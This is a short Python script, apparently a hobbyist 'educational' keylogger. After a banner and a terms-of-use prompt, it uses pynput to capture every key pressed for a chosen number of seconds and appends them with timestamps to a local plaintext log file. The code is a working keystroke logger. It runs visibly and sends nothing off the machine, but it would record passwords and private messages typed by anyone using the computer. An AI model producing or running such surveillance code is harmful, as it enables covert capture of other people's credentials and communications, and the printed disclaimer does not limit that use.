from pynput import keyboard
import time
import os
import sys

# Banner for the program
banner = """
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──████████─██████████████─████████──████████────██████████████─████████████████───██████████████─██████████████─██████──████████─
─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░██──██░░░░██────██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░██─
─██░░██──██░░████─██░░██████████─████░░██──██░░████────██████░░██████─██░░████████░░██───██░░██████░░██─██░░██████████─██░░██──██░░████─
─██░░██──██░░██───██░░██───────────██░░░░██░░░░██──────────██░░██─────██░░██────██░░██───██░░██──██░░██─██░░██─────────██░░██──██░░██───
─██░░██████░░██───██░░██████████───████░░░░░░████──────────██░░██─────██░░████████░░██───██░░██████░░██─██░░██─────────██░░██████░░██───
─██░░░░░░░░░░██───██░░░░░░░░░░██─────████░░████────────────██░░██─────██░░░░░░░░░░░░██───██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██───
─██░░██████░░██───██░░██████████───────██░░██──────────────██░░██─────██░░██████░░████───██░░██████░░██─██░░██─────────██░░██████░░██───
─██░░██──██░░██───██░░██───────────────██░░██──────────────██░░██─────██░░██──██░░██─────██░░██──██░░██─██░░██─────────██░░██──██░░██───
─██░░██──██░░████─██░░██████████───────██░░██──────────────██░░██─────██░░██──██░░██████─██░░██──██░░██─██░░██████████─██░░██──██░░████─
─██░░██──██░░░░██─██░░░░░░░░░░██───────██░░██──────────────██░░██─────██░░██──██░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░██─
─██████──████████─██████████████───────██████──────────────██████─────██████──██████████─██████──██████─██████████████─██████──████████─
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
"""
print(banner)
print("---------- Only For Educational Purpose ----------")
print("----- Keylogger By Techno-rabit -----")

# Defines the log file path
log_file_path = "keylogger_log.txt"

# Displays the disclaimer and get user acceptance
print("---------------- Keylogger Disclaimer ----------------")
print("This keylogger program is intended for educational and ethical purposes only.")
print("Unauthorized use, distribution, or modification of this program is strictly prohibited.")
print("By using this program, you agree to the following terms and conditions:")
print("\n1. You will only use this program on devices and systems for which you have explicit permission.")
print("2. You will not use this program to violate any laws, regulations, or terms of service.")
print("3. You will not use this program to harm, disrupt, or exploit any devices or systems.")
print("4. You will not use this program to intercept, collect, or store any sensitive or confidential information.")
print("5. You will not redistribute or sell this program without the express permission of the author.")
print("6. The author is not responsible for any damages or losses incurred as a result of using this program.")
print("7. You will respect the privacy and security of all devices and systems you interact with using this program.")

accept_terms = input("\nDo you accept these terms and conditions? (y/n): ")

if accept_terms.lower() != 'y':
    print("You must accept the terms and conditions before using this program.")
    sys.exit()

# Callback function to log keystrokes
def keylogger(key):
    try:
        # Format the timestamp and key press event
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        event = f"{timestamp} - {key.char}\n"
    except AttributeError:
        # Handle special keys like space, enter, etc.
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        if key == keyboard.Key.space:
            event = f"{timestamp} - [SPACE]\n"
        elif key == keyboard.Key.enter:
            event = f"{timestamp} - [ENTER]\n"
        elif key == keyboard.Key.backspace:
            event = f"{timestamp} - [BACKSPACE]\n"
        elif key == keyboard.Key.esc:
            event = f"{timestamp} - [ESC]\n"
        else:
            event = f"{timestamp} - {key}\n"

    # Writes the event to the log file
    with open(log_file_path, "a") as log_file:
        log_file.write(event)

# Prompts the user to enter the duration for which the keystrokes should be logged
log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))

# Sets up the keylogger listener
listener = keyboard.Listener(on_press=keylogger)
listener.start()

# Runs the keylogger for the specified duration
start_time = time.time()
end_time = start_time + log_duration

while time.time() < end_time:
    time.sleep(1)

# Stops the keylogger listener
listener.stop()

# Displays the log file path
print("\nThe log file has been saved to:", os.path.abspath(log_file_path))
